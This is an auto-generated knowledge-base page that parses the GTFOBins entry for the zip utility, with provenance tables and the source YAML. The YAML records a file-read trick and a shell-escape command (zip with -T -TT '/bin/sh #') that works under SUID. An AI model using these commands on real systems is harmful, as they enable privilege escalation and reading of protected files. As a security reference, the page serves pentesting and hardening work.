---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# zip

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `zip` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/zip` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [zip](../../tools/linux/zip.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | zip |
| name | zip |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/zip/ |

## Preserved Source Material

```yaml
_body: ''
_name: zip
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/zip
functions:
  file-read:
  - code: 'zip /path/to/temp-file /path/to/input-file

      unzip -p /path/to/temp-file'
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  shell:
  - code: 'zip /path/to/temp-file /etc/hosts -T -TT ''/bin/sh #'''
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
